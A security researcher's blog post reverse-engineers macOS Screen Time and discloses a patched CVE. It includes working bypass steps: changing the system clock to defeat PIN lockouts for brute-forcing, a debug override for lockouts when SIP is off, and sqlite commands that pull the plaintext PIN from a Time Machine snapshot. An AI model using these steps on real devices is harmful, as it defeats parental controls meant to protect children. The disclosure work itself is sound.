+++
title = "Breaking macOS Screen Time for fun and profit"
date = 2026-09-14
slug = "screentime"
description = "what makes this so secure after all?"

[taxonomies]
tags = ["reverse engineering", "macos"]

[extra]
standard_site_uri = "at://did:plc:krxbvxvis5skq7jj6eot23ul/site.standard.document/3mvjf2wbc7c2h"
+++

As every teenager with screentime limits knows regardless of how generous your limits are there is always an urge to circumvent or break the system. I have been playing with breaking screentime on and off for the last few years but never managed to fully compromise the system. I found workarounds sure, but nothing that ever fully satisfied my curiosity. Well that is untill today (2026.03.08).

<!-- more -->

Screen Time's pin system is deceptively simple in concept but heavily fortified in practice. The 4-digit PIN flows through four layers:

1. **UI** — you type the PIN into a view service
2. **Controller** — a state machine tracks attempts and lockouts
3. **XPC** — the PIN is sent to a background daemon for verification
4. **CoreData** — the stored PIN is compared against what you entered

As it turns out the PIN is not hashed and is simply stored in the screentime sqlite db :shock_dino: Apple stores it as a plain string. Unfortunately the db is stored in the datavault section of the disk so it's not possible to read unless you disable secure boot which just feels like cheating.

## The components

There's a frankly absurd number of frameworks/packages involved in screentime. The main ones I could find:

| Framework                     | What it does                                      |
| ----------------------------- | ------------------------------------------------- |
| ScreenTimeCore (private)      | Core logic, the agent daemon, passcode management |
| ScreenTimeUI (private)        | Lockout UI, PIN entry views                       |
| ScreenTimeServiceUI (private) | XPC view service that hosts the PIN entry         |
| FamilyControls                | Family authorization and management               |
| ManagedSettings               | Shield and restriction enforcement                |
| UsageTracking (private)       | App usage data collection                         |

The main binary is `ScreenTimeAgent`, which lives inside `ScreenTimeCore.framework` and runs as a per-user launch agent. Dumping its exports shows the passcode classes:

```
$ dyld_info -exports ScreenTimeCore.framework/ScreenTimeCore | grep -i passcode

0x3E5F83F8  _OBJC_CLASS_$_STOpaquePasscode
0x3F1D79E0  _OBJC_CLASS_$_STConcretePasscodeAuthenticationProviderService
0x3F1D7A80  _OBJC_CLASS_$_STConcretePasscodeProviderService
0x3F1D8278  _OBJC_CLASS_$_STPasscodeActivityUserNotificationContext
0x389293D0  _STBlueprintConfigurationTypePasscodeSettings
```

## How verification works

### Step 1: you enter the PIN

The PIN entry UI lives in `ScreenTimeViewService.xpc`: a separate XPC view service under `ScreenTimeServiceUI.framework`. You type into a swift `STPasscodeField` and the view controller calls:

```objc
authenticateWithPIN:allowPasscodeRecovery:completionHandler:
```

### Step 2: the state machine

`STPINController` (from ScreenTimeCore) manages the attempt lifecycle. It tracks `passcodeEntryAttemptCount` and `passcodeEntryTimeoutEndDate` on a CoreData entity called `STUserDeviceState`. After too many failures you get escalating lockouts. It posts `STPINControllerTimeoutDidBegin` and `STPINControllerTimeoutDidExpire` to coordinate the UI.

The lockout escalation is driven by a lookup table embedded in the binary:

```swift
// From STPINController — _timeoutEndDate(forAttemptNumber:) @ 0x1ae57dae8
@objc private func _timeoutEndDate(forAttemptNumber attemptNumber: Int) -> Date {
    var timeoutInterval: TimeInterval = 0

    if attemptNumber > 5 {
        let index = attemptNumber - 6
        if index < 3 {
            // Escalating timeout from lookup table at DAT_1ae5ee4f8
            let timeoutTable: [TimeInterval] = [60, 300, 900]  // 1min, 5min, 15min
            timeoutInterval = timeoutTable[index]
        } else {
            // Max timeout for attempt 9+
            timeoutInterval = 3600  // 1 hour
        }
    }

    return Date(timeIntervalSinceNow: timeoutInterval)
}
```

So: attempts 1-5 don't trigger anything, attempt 6 triggers a 1-minute lockout, then 5 minutes, 15 minutes, and 1 hour for every attempt after that.

### Step 3: XPC to the agent

The controller sends the PIN over XPC to `ScreenTimeAgent` via the `com.apple.ScreenTimeAgent.private` Mach service. You can see all the registered Mach services in the launch agent plist:

```xml
<!-- from /System/Library/LaunchAgents/com.apple.ScreenTimeAgent.plist -->
<key>com.apple.ScreenTimeAgent.private</key>
<key>com.apple.ScreenTimeAgent.settings</key>
<key>com.apple.ScreenTimeAgent.setup</key>
<key>com.apple.ScreenTimeAgent.persistence</key>
<key>com.apple.ScreenTimeAgent.ask-for-time</key>
<key>com.apple.ScreenTimeAgent.ask</key>
<key>com.apple.ScreenTimeAgent.communication</key>
<key>com.apple.ScreenTimeAgent.downtime</key>
<key>com.apple.ScreenTimeAgent.diagnostics-service</key>
<key>com.apple.ScreenTimeAgent.accessrequestor</key>
<key>com.apple.ScreenTimeAgent.accessresponder</key>
<key>com.apple.ScreenTimeAgent.organization-status</key>
<key>com.apple.ScreenTimeAgent.Contacts</key>
<key>com.apple.ScreenTimeAgent.reactor-tool</key>
<key>com.apple.ScreenTimeAgent.command-line-tool</key>
```

The `.private` service contains passcode auth. Stringing it gives us:

```
PrivateService.authenticateRestrictionsPasscode
PrivateService.setRestrictionsPasscode
PrivateService.clearRestrictionsPasscode
PrivateService.isRestrictionsPasscodeSet
PrivateService.fetchRestrictionsPasscodeEntryAttemptCountAndTimeoutDate
```

The server-side named Mach services validate entitlements leading to sad errors like this:

```
Client %{public}@ does not have required %{public}@ entitlement
Client %{public}@ does not have a required entitlement: any of %{public}@, %{public}@, %{public}@
Rejecting connection: Missing entitlement: %{private}@.
```

However, not all XPC services are guarded equally. The client-side service providers (`STConcreteClientXPCServiceProvider`, `STSetupServiceClient`, `STCommunicationServiceClient`) accept connections with **no entitlement or identity checks at all**:

```swift
// From STXPCServiceProvider - STConcreteClientXPCServiceProvider @ 0x1ae5486c0
@objc func listener(_ listener: NSXPCListener,
                    shouldAcceptNewConnection connection: NSXPCConnection) -> Bool {

    // structurally make sure it matches what is expected
    guard listener === self.activeListener else {
        os_log("Rejecting connection: Listener did not match active listener", log: Self.log)
        return false
    }
    guard let service = self.providedService else {
        os_log("Rejecting connection: Unable to find provided service.", log: Self.log)
        return false
    }
    guard let serviceInterface = self.providedServiceInterface else {
        os_log("Rejecting connection: Unable to find provided service interface.", log: Self.log)
        return false
    }

    // Connection accepted :yay: :party:
    connection.exportedInterface = serviceInterface
    connection.exportedObject = service
    connection.resume()
    return true
}
```

### Step 4: the comparison

ScreenTimeAgent reads the `effectivePasscode` (an `STOpaquePasscode` object) from its CoreData store and compares it directly as plaintext:

```swift
// From STPINController — authenticateWithPIN:forUser:context:error: @ 0x1ae57c5a0
guard let storedPasscode = user.effectivePasscode else {
    os_log(.error, log: .pinController,
           "WARN: Attempting to authenticate against an unset PIN, this seems unexpected")
    user.passcodeEntryAttemptCount = 0
    return _saveAndReturnResult(nil, forUser: user, context: context, error: error)
}

// annnnnd its just a plain string
if pin.isEqual(to: storedPasscode) {
    // reset lockout state machine
    user.passcodeEntryAttemptCount = 0
    user.passcodeEntryTimeoutEndDate = nil
    user.passcodeRecoveryAttemptCount = 0
    self.timeoutEndDate = nil
    // ...
}
```

## Where the PIN is stored

The pin lives in a CoreData SQLite database. i originally found it by looking at what files `screentimeagent` had open:

```
$ lsof -c ScreenTimeAgent | grep sqlite

ScreenTim 766 kierank  3u  REG  RMAdminStore-Local.sqlite
ScreenTim 766 kierank  4u  REG  RMAdminStore-Local.sqlite-wal
ScreenTim 766 kierank  7u  REG  RMAdminStore-Cloud.sqlite
ScreenTim 766 kierank  8u  REG  RMAdminStore-Cloud.sqlite-wal
```

Both live under `/private/var/folders/.../com.apple.ScreenTimeAgent/Store/`. The local store has the PIN and the cloud store syncs some stuff (??? still not entirely sure what happens on the cloud path but it appears to be some sort of staging area?) to iCloud.

The CoreData model (`ScreenTime.momd`) defines the db schema. Extracting it with `plutil`:

```
$ plutil -p ScreenTime.momd/Current.mom | grep -i passcode

149 => "passcode"
240 => "passcodeRecoveryAttemptCount"
243 => "passcodeEntryAttemptCount"
252 => "passcodeEntryTimeoutEndDate"
513 => "needsToSetPasscode"
538 => "supportsPasscodeActivity"
540 => "lastPasscodeUseDate"
632 => "passcodeOwner"
```

These fields live on the `STBlueprintConfiguration` entity (mapped to table `BlueprintConfiguration`). The `passcode` field is a transformable type containing an `STOpaquePasscode`.

Despite the name "Opaque", `STOpaquePasscode` is just a thin wrapper around a plaintext string:

```swift
// From STOpaquePasscode reconstructed from decompilation
@objc class STOpaquePasscode: NSObject, NSSecureCoding, NSCopying {

    // basically just a string
    @objc private(set) var passcode: String  // ivar at offset +0x08

    @objc init(passcode: String) {
        self.passcode = passcode.copy() as! String
        super.init()
    }

    // NSSecureCoding: encodes/decodes as a plaintext NSString
    @objc required init?(coder: NSCoder) {
        let decoded = coder.decodeObject(of: NSString.self, forKey: "passcode") as String?
        self.passcode = (decoded ?? "").copy() as! String
        super.init()
    }

    @objc func encode(with coder: NSCoder) {
        coder.encode(passcode, forKey: "passcode")
    }

    // theoretically timing attackable since it short circuits comparison and isnt timing resistent
    @objc func isEqual(toOpaquePasscode other: STOpaquePasscode) -> Bool {
        if other === self { return true }
        return other.passcode.isEqual(to: self.passcode)
    }
}
```

Running `screentimediagnose inspect --verbose` can give a wee bit of info:

```
isPasscodeSet = 1;
managed = 1;
needsToSetPasscode = 0;
screenTimeEnabled = 1;
```

## Why no hashing?

As insane as this initially sounds for classic database security it is actually not unreasonable. A 4-digit PIN has exactly 10,000 possible values. Even with a strong KDF like PBKDF, an attacker with offline access to the hash could brute-force all 10,000 combinations in minutes or seconds. Hashing a PIN this short provides essentially zero security. (sidenote but this is actually the exact same tradeoff my team was just debating a few weeks ago for Mitre's [ectf](https://ectf.mitre.org/) though we chose a defense in depth approach and still hashed it anyway)

Apple chooses to just worry about the hardware protection side which is probably the best way to secure it.

## The four layers of protection

### Layer 1: TCC

Screen Time data requires the `com.apple.private.screen-time.persistence` entitlement. Standard Full Disk Access doesn't grant access and there doesn't appear to be any path to give anything non Apple signed that entitlement.

### Layer 2: datavault

The `Store/` directory is protected by a **datavault** Apple's kernel-level sandbox mechanism that restricts file access to processes with specific entitlements. Truely the bane of my investigation as it breaks so many things

```bash
# nope
sqlite3 RMAdminStore-Local.sqlite ".tables"
# authorization denied

# nope
sudo sqlite3 RMAdminStore-Local.sqlite ".tables"
# authorization denied

# nope
sudo cp RMAdminStore-Local.sqlite /tmp/
# Operation not permitted

# nope
python3 -c "import sqlite3; sqlite3.connect('RMAdminStore-Local.sqlite')"
# authorization denied

# nope :(
sudo strings RMAdminStore-Local.sqlite
# Operation not permitted
```

Root doesn't help nor does Full Disk Access. The datavault is enforced at the VFS layer in the kernel and only processes signed with Apple's entitlement can access it. Finding a bypass at the datavault level would be absolutely insane

### Layer 3: SIP

System Integrity Protection prevents modifying ScreenTimeAgent, injecting dylibs into it, or attaching a debugger:

```bash
$ sudo lldb -p $(pgrep ScreenTimeAgent)

error: attach failed: attach failed (Not allowed to attach to process.
Look in the console messages (Console.app), near the debugserver entries,
when the attach failed. The subsystem that denied the attach permission
will likely have logged an informative message about why it was denied.)
```

### Layer 4: iCloud encryption (CKKS)

When synced to iCloud the passcode is protected by CloudKit Key-Value Store encryption at the `Manatee` tier same  as iCloud Keychain passwords and credit cards. The CloudKit container is selected at runtime based on a UserDefaults boolean:

```swift
// From STCloudKitSync — CKContainer extension @ 0x1ae5183a4
extension CKContainer {
    @objc static func remotemanagement_mirroringContainerIdentifier() -> String {
        let defaults = UserDefaults.standard
        let useAlternateContainer = defaults.bool(forKey: /* redacted key */)
        if useAlternateContainer {
            return "com.apple.screentime.remotemanagement.mirror"
        } else {
            return "com.apple.screentime.mirror"
        }
    }
}
```

The default container is `com.apple.screentime.mirror`, with `com.apple.screentime.remotemanagement.mirror` as an alternate for remote management scenarios.

Sync happens over IDS (Identity Services) using two topics (from the launchd plist):

```bash
com.apple.private.alloy.screentime
com.apple.private.alloy.digitalhealth
```

If you disable SIP it is fairly trivial to dump the DB as it becomes possible to disable most if not all of these protections but thats boring so let's keep going.

## The parent notification system

When a child hits a time limit and taps "Ask For More Time", the request flows through the `com.apple.ScreenTimeAgent.ask-for-time` XPC service. Dumping the class exports shows the whole object hierarchy:

```bash
$ dyld_info -exports ScreenTimeCore | grep AskForTime

_OBJC_CLASS_$_STAskForTimeClient
_OBJC_CLASS_$_STAskForTimeRequest
_OBJC_CLASS_$_STAskForTimeResponse
_OBJC_CLASS_$_STAskForTimeRequestResponse
_OBJC_CLASS_$_STAskForTimeResource
_OBJC_CLASS_$_STAskForTimeApplicationResource
_OBJC_CLASS_$_STAskForTimeCategoryResource
_OBJC_CLASS_$_STAskForTimeWebsiteResource
_OBJC_CLASS_$_STAskForTimeRequestReceivedUserNotificationContext
_OBJC_CLASS_$_STAskForTimeApprovedResponseReceivedUserNotificationContext
_OBJC_CLASS_$_STAskForTimeNotApprovedResponseReceivedUserNotificationContext
_STAskForTimeRequestOneMinuteInterval
_STAskForTimeRequestFifteenMinuteInterval
_STAskForTimeRequestOneHourInterval
_STAskForTimeRequestRestOfDayInterval
```

The agent wraps the request in an `STAskForTimeRequest` and sends it to parents via IDS. The parent gets a notification with quick-reply actions:

```
Approved Fifteen Minutes
Approved One Hour
Approved Rest Of Day
```

A few fancy log strings:

```
Begin ask for time request for %{public}@, deliverQuietly set to %{public}@
Persisted more time request %{public}@ for %{public}@, will attempt send to parents
Successfully sent more time request %{public}@ to parent
Could not send ask for time request for %{public}@: %{public}@
Received ask request %{public}@ (%{public}@) from %{public}@ - requested at %{public}@
Last ask for time request still outstanding for %{public}@, request expires %{public}@
Last ask for time request approved for %{public}@ at %{public}@ for %{public}@ minutes
Last ask for time request denied for %{public}@ at %{public}@
Dropping expired ask for time request: %{public}@
Ask for time was approved without time amount or invalid resource type
```

The `deliverQuietly` flag is interesting. The method `shouldDeliverNotificationQuietlyWithCompletion:` determines whether the parent notification should be suppressed if there was some way to hook this that would be interesting. Unfortunately I did not find a way to do this so lets also move on.

### IDS transport

All inter-device communication goes through Apple's IDS (Identity Services) infrastructure:

```bash
$ strings ScreenTimeAgent | grep RMUnifiedTransportPayloadType

RMUnifiedTransportPayloadTypeCheckinRequest
RMUnifiedTransportPayloadTypeCheckinResponse
RMUnifiedTransportPayloadTypeBlueprints
RMUnifiedTransportPayloadTypeUserDeviceState
RMUnifiedTransportPayloadTypeUsageRequest
RMUnifiedTransportPayloadTypeUsageResponse
RMUnifiedTransportPayloadTypeAskForTimeRequest
RMUnifiedTransportPayloadTypeAskForTimeResponse
RMUnifiedTransportPayloadTypeFamilySettings
RMUnifiedTransportPayloadTypePasscodeActivity
STUnifiedTransportPayloadTypeAskForTimeResponseV2
```

There are three IDS topics:

```bash
com.apple.private.alloy.screentime # primary channel
com.apple.private.alloy.digitalhealth # secondary channel
com.apple.private.alloy.screentimelocal  # same-device communication
```

Messages are tracked in a `STTransportServiceMessageLedger` for deduplication, and there's a retry system for failed deliveries:

```bash
com.apple.ScreenTimeAgent.activity.retry-failed-messages
com.apple.ScreenTimeAgent.activity.fail-stuck-sent-messages
```

Killing ScreenTimeAgent won't permanently suppress messages; they'll be retried on relaunch. From personal testing I have found that it tends to flush the notifications on device restart but I haven't found hard evidence to back this theory.

### Passcode activity notifications

When the Screen Time passcode is used on a child's device, a notification fires off to parents over IDS using the `RMUnifiedTransportPayloadTypePasscodeActivity` payload type. The agent has dedicated dispatch queues for this:

```
com.apple.ScreenTimeAgent.familyOrganizationController.sendPasscodeActivity
com.apple.ScreenTimeAgent.familyOrganizationController.handlePasscodeActivity
```

### Configuration push flow

Parents push settings to children via "blueprints", Apple's versioned configuration snapshots sent as `RMUnifiedTransportPayloadTypeBlueprints`. Family membership is fetched from Apple servers and cached locally:

```
<%@: {DSID: %@, AltDSID: %@, FirstName: %@, MemberType: %@, SignedIn: %@, Parent: %@ }>
```

## Attacking the state machine

The lockout mechanism finally has an exploitable flaw. Looking at how the timer works, the agent stores the lockout expiry as `passcodeEntryTimeoutEndDate` on the `STUserDeviceState` CoreData entity. The comparison logic uses wall clock time:

```bash
$ strings ScreenTimeAgent | grep -E "Date|timeout|attempt"

passcodeEntryAttemptCount
passcodeEntryTimeoutEndDate
statusWithIncrementedAttempts
Fetching Restrictions passcode entry attempt count and timeout date
Getting a restrictions passcode attempt count and timeout date

$ strings ScreenTimeAgent | grep -E "laterDate|earlierDate|timeInterval"

laterDate:
earlierDate:
timeIntervalSinceNow
dateByAddingTimeInterval:
dateWithTimeIntervalSinceNow:
```

It appears to be using`NSDate` which means **If you advance the system clock forward past the timeout date, the lockout expires immediately.** On macOS, date/time settings are not restricted by Screen Time (unlike iOS where Settings access can be locked down). So the attack is:

1. Fail 6 PIN attempts, trigger a 1-minute lockout
2. Open System Settings -> Date & Time
3. Advance the clock forward by the lockout duration
4. Try again with a fresh set of attempts
5. Repeat until you've brute-forced all 10,000 combinations

The lockout state itself _is_ persisted to CoreData via `writeDeviceStateChange:`, so killing ScreenTimeAgent doesn't reset the attempt counter (leading to hilarious screenshots like the following). But the clock attack basically means we can ignore the lockout system.

![4202 screentime pin attempts](https://l4.dunkirk.sh/i/IB7jwClEkhWs.webp){caption="4202 attempts and counting"}

### The debug timeout override

There's actually a much cleaner way to defeat the lockouts if SIP is disabled. The decompiled `_beginTimeout` method checks whether SIP is off and if so reads an override from UserDefaults:

```swift
// From STPINController — _beginTimeout(untilDate:) @ 0x1ae57db20
var sipStatus: Int32 = 0x10
_csr_check(&sipStatus)
if sipStatus == 0 {
    // SIP is disabled — check for debug timeout override
    let defaults = UserDefaults.standard
    let overrideTimeout = defaults.integer(forKey: "STPINControllerDebugTimeoutSeconds")
    if overrideTimeout > 0 {
        os_log(.debug, log: .pinController, "Overriding PIN timeout")
        timeoutSeconds = TimeInterval(overrideTimeout)
    }
}
```

With SIP disabled, you can set the lockout to 1 second: `defaults write <bundle-id> STPINControllerDebugTimeoutSeconds -integer 1`. It is quite interesting that this backdoor was left in by Apple. I have no clue why this would be needed.

### The override declaration system

When you enter the PIN to approve more time, or when a parent approves an "Ask for Time" request, the agent creates an "override declaration" or a temporary rule that bypasses the normal limits:

```bash
$ strings ScreenTimeAgent | grep -i "override.*declaration\|declaration.*override"

Error saving ask for more override declaration: %{public}@
Failed to persist remind me request/ PIN authenticated ask with override declarations: %{public}@
Successfully persisted remind me request/ PIN authenticated ask with override declarations
Successfully saved ask for time override declaration for %{private}@
```

Interestingly the remind me system also works on temporary blueprints like this as well.

### The "One More Minute" loophole

"One More Minute" is gated by a feature flag and controlled via `shouldAllowOneMoreMinute`:

```bash
$ strings ScreenTimeAgent | grep -i "one.*more.*minute"

Expiring One More Minute for %{public}@
Should allow one more minute for %{public}@ : %{BOOL}u
PrivateService.shouldAllowOneMoreMinuteForBundleIdentifier
PrivateService.shouldAllowOneMoreMinuteForCategoryIdentifier
PrivateService.shouldAllowOneMoreMinuteForWebDomain
```

It checks against `fetchUnexpiredOneMoreMinuteBlueprintsForUserWithDSID:` -- one-minute extensions are blueprints with expiration dates. And since those expiration dates also use wall clock time via `computeNextOverrideEndDateForState:creationDate:inCalendar:`, the same clock manipulation lets you chain unlimited one-minute extensions.

The decompiled code for the OMM check weirdly xors the return with 1 inverting the boolean:

```swift
// From STOneMoreMinute @ 0x1000787e0
@objc func shouldAllowOneMoreMinute(forBundleIdentifier bundleId: String,
                                    oneMoreMinuteBlueprints blueprints: Any) -> Bool {
    let internalResult = performBlueprintCheck(bundleId, blueprints: blueprints, block: block)

    return internalResult ^ 1
}
```

All three variants (bundle ID, web domain, category) use the same `^ 1` inversion interestingly.

### Some interesting strings

The feature flag exports from ScreenTimeCore include:

```
$ dyld_info -exports ScreenTimeCore | grep harden

_$s14ScreenTimeCore0aB12FeatureFlagsO26hardenShieldAuthenticationyA2CmFWC
```

it will be interesting to see what they do to harden shield auth

## The Time Machine bypass

And now we get to the fun part! [CVE-2026-65380](https://support.apple.com/en-us/149035#:~:text=CVE%2D2026%2D65380%3A%20Kieran%20Klukas%20(taciturnaxolotl))

### Why the datavault doesn't matter

Remember the datavault? The kernel-level protection that blocks even root from reading the Screen Time database? It has an exception. Time Machine's `backupd` daemon has a special entitlement:

```
$ codesign -d --entitlements - /System/Library/CoreServices/TimeMachine/backupd

com.apple.rootless.datavault.controller = true
com.apple.private.tcc.allow = kTCCServiceSystemPolicyAllFiles
```

`com.apple.rootless.datavault.controller` lets `backupd` read through datavault protection. It needs this to back up system data. And critically, `/private/var/folders` — where the Screen Time database lives -- is **not excluded** from Time Machine:

```
$ tmutil isexcluded /private/var/folders
[Included]  /private/var/folders
```

So Time Machine dutifully backs up the datavault-protected Screen Time database. When it writes the backup, the datavault enforcement doesn't get copied onto the new file system. The backup copy is a regular file owned by the user.

### Execution

Time Machine creates local APFS snapshots even before the backup finishes copying to the external drive (very helpful as I didn't have a spare disk with any size on it at the time). These snapshots are mounted and readable:

```
$ ls -la "/Volumes/com.apple.TimeMachine.localsnapshots/Backups.backupdb/\
$(hostname)/$(tmutil latestbackup | xargs basename)/Data/private/var/\
folders/.../com.apple.ScreenTimeAgent/"

drwx------@ - kierank  9 Mar 00:53 Store
```

Compare that to the normal directory:

```
$ ls -lO /private/var/folders/.../0/ | grep ScreenTimeAgent

d--------- - root    - -            com.apple.ScreenTimeAgent
```

One can now open the database:

```
$ sqlite3 "<snapshot_path>/.../Store/RMAdminStore-Local.sqlite" \
    "PRAGMA table_info(ZCOREORGANIZATIONSETTINGS);" | grep -i passcode

28|ZPASSCODE|VARCHAR|0||0
30|ZPASSCODE1|VARCHAR|0||0
31|ZPASSCODE2|VARCHAR|0||0
```

`ZPASSCODE1` is the column that contains the pin:

```
$ sqlite3 "<snapshot_path>/.../Store/RMAdminStore-Local.sqlite" \
    "SELECT ZPASSCODE1 FROM ZCOREORGANIZATIONSETTINGS
     WHERE ZPASSCODE1 IS NOT NULL LIMIT 1;"

1918
```

Et voila.

### Why this works

The datavault is enforced by the kernel at the VFS layer on the **system volume**. It checks the `UF_DATAVAULT` flag and denies access to processes without the right entitlement. This flag isnt respected on external drives (which makes sense since you can't enforce it on other kernels if you can remove the drive).

`backupd` reads the datavault-protected file (since it has the entitlement), writes it to the snapshot (with the flag preserved as metadata), and the snapshot is mounted without datavault enforcement. The protection evaporates at the mount boundary.

## Bonus: apple has a typo in their code

While poking through the CoreData model I noticed one of the store names is `restricitonsStoreName` which amuses me.

### The bruteforce script

After realizing that its possible to fast forward past the delays I wrote a little script that uses `osascript` to interact with the accessibility api and automate bruteforcing the pin. Hence the 4,202 wrong pins.

## Timeline

March 8th, 2026 - Discovered inital screentime workaround
March 9th, 2026 at 3:11 PM - Submitted report to Apple 
July 14th, 2026 - Didn't receive further communication from Apple and was preparing to publish this article after 128 days when I noticed that the security report had been updated without a notification and was scheduled to be fixed in Fall 2026 (likely Tahoe public release).
September 14th, 2026 at 5:27 PM - Received a $1000 bounty and [CVE-2026-65380](https://support.apple.com/en-us/149035#:~:text=CVE%2D2026%2D65380%3A%20Kieran%20Klukas%20(taciturnaxolotl)) is published

_Research conducted via Ghidra decompilation of ScreenTimeCore.framework and ScreenTimeAgent (macOS 15.3, arm64e), binary analysis (`dyld_info`, `nm`, `strings`), runtime inspection (`lsof`, `screentimediagnose`), CoreData model extraction (`plutil`), and XPC service enumeration on macOS Tahoe 26.3.1 with ScreenTimeCore 605.3.1._
